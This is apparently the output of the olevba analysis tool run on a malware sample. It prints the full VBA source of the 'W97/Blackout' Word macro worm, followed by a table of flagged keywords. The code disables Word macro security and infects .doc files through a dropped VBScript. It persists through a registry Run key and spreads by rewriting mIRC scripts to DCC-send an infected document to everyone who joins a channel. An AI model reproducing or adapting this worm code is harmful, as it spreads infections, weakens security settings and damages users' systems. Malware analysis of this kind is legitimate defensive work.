olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./IRC-Worm.MSWord.Blackput
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./IRC-Worm.MSWord.Blackput 
in file: ./IRC-Worm.MSWord.Blackput - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wm97.Blackout.a by ?






































































'W97/Blackout
Private Sub Document_Open()
On Error Resume Next

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars("Macro").Controls("Security").Enabled = False

Set Ad = ActiveDocument.VBProject.VBComponents
Open "c:\blackout.vxd" For Output As #1
Print #1, Ad.Item(1).codemodule.Lines(1, Ad.Item(1).codemodule.CountofLines)
Close #1

Open "c:\blackout.vbs" For Output As #2
Print #2, "'W97/Blackout"
Print #2, "On Error Resume Next"
Print #2, ""
Print #2, "Set fso=CreateObject(""Scripting.FileSystemObject"")"
Print #2, "Set ws=CreateObject(""Wscript.Shell"")"
Print #2, "Set wa=CreateObject(""Word.Application"")"
Print #2, ""
Print #2, "infwd(""c:\mydocu~1\"")"
Print #2, ""
Print #2, "function infwd(doc)"
Print #2, "If f.FolderExists(doc) Then"
Print #2, ""
Print #2, "For Each wd in f.GetFolder(doc)"
Print #2, "ext=f.GetExtensionName(wd.Name)"
Print #2, "if ext=""doc"" or ext=""DOC"" Then"
Print #2, "Set wp=wa.application"
Print #2, "wp.Documents.Open wd.name"
Print #2, "Set ad=wp.ActiveDocument.VBProject.VBComponents.Item(1)"
Print #2, "if ad.name <> ""Blackout"" then"
Print #2, "ad.CodeModule.AddFromFile ""c:\blackout.vxd"" "
Print #2, "ad.name=""Blackout"""
Print #2, "wp.ActiveDocument.ReadOnlyRecommended = true"
Print #2, "wp.ActiveDocument.Save"
Print #2, "End If"
Print #2, "End If"
Print #2, "Next"
Print #2, "End If"
Print #2, ""
Print #2, "End Function"
Close #2

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "blackout") = "c:\blackout.vbs"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Blackout", "ppacket") = "by pickpacket"
If Dir("c:\mirc\mirc32.exe") <> "" Then
script = "c:\mirc\script.ini"
ElseIf Dir("c:\progra~1\mirc\mirc32.exe") <> "" Then
script = "c:\progra~1\mirc\script.ini"
End If
ActiveDocument.SaveAs FileName:="c:\readme.txt.doc"

If script <> "" Then
Open script For Output As #3
Print #3, "[script]"
Print #3, "n0=on 1:Join:#: {"
Print #3, "n1=/if ($nick == $me ) {Halt}"
Print #3, "n2=/DCC Send (c:\readme.txt.doc)"
Print #3, "n3=/Clear"
Print #3, "n4=/MOTD"
Print #3, "n5=}"
Close #3
End If

If Hour(Now) = Rnd * 23 Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1&
Assistant.Visible = True
Assistant.Animation = msoAnimationGetTechy
With Assistant.NewBalloon
.Heading = "W97/Blackout"
.Text = "This goes out to the people in the power companies!!!"
.Show
End With
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |blackout.vbs        |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

